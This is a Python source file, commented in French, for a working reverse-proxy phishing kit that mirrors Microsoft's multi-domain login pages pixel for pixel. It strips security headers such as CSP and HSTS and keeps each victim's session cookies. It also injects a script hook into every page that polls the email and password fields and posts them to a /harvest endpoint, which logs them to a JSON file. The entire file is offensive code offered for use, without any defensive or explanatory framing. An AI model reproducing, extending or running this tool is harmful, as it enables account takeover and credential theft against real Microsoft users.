#!/usr/bin/env python3
# language: Python 3, file: mirror_proxy.py v2 — LE MIROIR MULTI-DOMAINES, target: macOS
# Reverse-proxy du VRAI flux de connexion Microsoft (multi-etapes, multi-domaines)
# Domaines en liste blanche: login.microsoftonline.com, login.live.com, account.microsoft.com,
# login.windows.net, device.login.microsoftonline.com
# - HTML servi depuis le reel, CSS/JS depuis les vrais CDN -> rendu pixel-perfect
# - hook injecte : capture email + mot de passe PENDANT la saisie (poll 700 ms + clic)
# - /__away/<url> : maintient les sauts de domaine dans le miroir (login.live.com etc.)
# - <base href> injecte sur les pages away + cookies amont stockes par victime
# - CSP/XFO stripees, redirections whitelistees restent dans le miroir
# Usage: python3 mirror_proxy.py login.microsoftonline.com 8086
import http.server, urllib.request, urllib.error, urllib.parse, json, time, os, sys, threading

UPSTREAM = sys.argv[1] if len(sys.argv) > 1 else "login.microsoftonline.com"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8086
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sorties")
os.makedirs(OUT, exist_ok=True)
CAPS = os.path.join(OUT, "mirror_captures.json")
COOKIES = {}   # ip_victime -> cookies amont (partages entre les domaines whitelistes)
WHITELIST = ["login.microsoftonline.com", "login.live.com", "account.microsoft.com",
             "login.windows.net", "device.login.microsoftonline.com"]
CAPS_LOCK = threading.Lock()

HOOK = """<script>
(function(){
  var u = "";
  var BEACON = window.location.origin + "/harvest";
  function send(){
    var p = "";
    document.querySelectorAll('input[type=password]').forEach(function(i){ if(i.value) p = i.value; });
    if (p) {
      fetch(BEACON, {method:'POST', body: JSON.stringify({u: u, p: p}), keepalive: true});
    }
  }
  setInterval(function(){
    document.querySelectorAll('input').forEach(function(i){
      var t = (i.type||'').toLowerCase();
      if (t === 'email' || i.name === 'loginfmt' || i.id === 'i0116') { if (i.value) u = i.value; }
    });
  }, 300);
  document.addEventListener('click', function(){ setTimeout(send, 60); }, true);
  setInterval(send, 700);
})();
</script>"""

def fetch_upstream_abs(url, method="GET", body=None, headers=None, ip=""):
    req = urllib.request.Request(url, method=method, data=body)
    if headers:
        for k, v in headers.items():
            if k.lower() in ("host", "cookie", "content-length", "accept-encoding"): continue
            req.add_header(k, v)
    req.add_header("User-Agent", (headers or {}).get("User-Agent", "Mozilla/5.0"))
    req.add_header("Accept-Encoding", "identity")   # jamais de gzip : l'injection de hook exige le brut
    jar = COOKIES.get(ip, {})
    if jar: req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in jar.items()))
    try:
        r = urllib.request.urlopen(req, timeout=25)
        sc, hdrs, data = r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        sc, hdrs, data = e.code, e.headers, e.read()
    except Exception as e:
        return 502, {"Content-Type": "text/plain"}, str(e).encode()
    jar = COOKIES.setdefault(ip, {})
    for sc_ in hdrs.get_all("Set-Cookie") or []:
        kv = sc_.split(";")[0]
        if "=" in kv:
            k, v = kv.split("=", 1)
            jar[k.strip()] = v.strip()
    return sc, hdrs, data

def fetch_upstream(path, method="GET", body=None, headers=None, ip=""):
    return fetch_upstream_abs(f"https://{UPSTREAM}{path}", method, body, headers, ip)

class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def proxy(self):
        ip = self.client_address[0]
        path = self.path
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(n) if n else None
        fwd = {k: v for k, v in self.headers.items()}

        away_base = None
        if path.startswith("/__away/"):
            target = path[len("/__away/"):].replace("__sl__", "/")
            p = urllib.parse.urlparse(target)
            if p.netloc not in WHITELIST:
                self.send_response(302)
                self.send_header("Location", target)
                self.send_header("Content-Length", "0"); self.end_headers(); return
            sc, hdrs, data = fetch_upstream_abs(target, self.command, body, fwd, ip)
            away_base = f"{p.scheme}://{p.netloc}"
        else:
            sc, hdrs, data = fetch_upstream(path, self.command, body, fwd, ip)

        ctype = hdrs.get("Content-Type", "text/html")
        loc = hdrs.get("Location", "")
        if loc:
            if loc.startswith("http"):
                pl = urllib.parse.urlparse(loc)
                loc2 = "/__away/" + loc if pl.netloc in WHITELIST else loc
            else:
                base = away_base or f"https://{UPSTREAM}"
                abs_loc = base + (loc if loc.startswith("/") else "/" + loc)
                pl = urllib.parse.urlparse(abs_loc)
                loc2 = "/__away/" + abs_loc if pl.netloc in WHITELIST else loc
            self.send_response(sc)
            self.send_header("Location", loc2)
            for k, v in hdrs.items():
                if k.lower() in ("location", "set-cookie", "content-security-policy",
                                 "x-frame-options", "content-length", "strict-transport-security"):
                    continue
                self.send_header(k, v)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        self.send_response(sc)
        skip = ("set-cookie", "content-security-policy", "x-frame-options",
                "content-length", "strict-transport-security", "transfer-encoding")
        for k, v in hdrs.items():
            if k.lower() in skip: continue
            self.send_header(k, v)
        if "text/html" in ctype:
            html = data.decode(errors="ignore")
            if away_base:
                html = html.replace("<head>", f'<head><base href="{away_base}/">', 1)
            if "</body>" in html:
                html = html.replace("</body>", HOOK + "</body>")
            data = html.encode()
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    do_GET = proxy
    do_HEAD = proxy

    def do_POST(self):
        if self.path == "/harvest":
            n = int(self.headers.get("Content-Length", 0) or 0)
            raw = self.rfile.read(n).decode(errors="ignore")
            try:
                d = json.loads(raw)
            except Exception:
                d = {"raw": raw}
            entry = {
                "heure": time.strftime("%Y-%m-%d %H:%M:%S"),
                "ip": self.client_address[0],
                "user_agent": self.headers.get("User-Agent", ""),
                "site_miroir": UPSTREAM,
                "identifiant": d.get("u", ""),
                "mot_de_passe": d.get("p", ""),
            }
            with CAPS_LOCK:
                caps = json.load(open(CAPS)) if os.path.exists(CAPS) else []
                caps.append(entry)
                json.dump(caps, open(CAPS, "w"), ensure_ascii=False, indent=1)
            print(f"[MIRROR CAPTURE] {entry['heure']} IP={entry['ip']} "
                  f"{entry['identifiant']} : {entry['mot_de_passe']}")
            self.send_response(204); self.end_headers()
            return
        self.proxy()

    def do_GET(self):
        if self.path == "/harvest":
            self.send_response(204); self.end_headers(); return
        self.proxy()

    def log_message(self, *a): pass

if __name__ == "__main__":
    print(f"[*] LE MIROIR v2 (multi-domaines) : {WHITELIST}")
    print(f"    reflété sur http://127.0.0.1:{PORT} — captures -> {CAPS}")
    http.server.ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
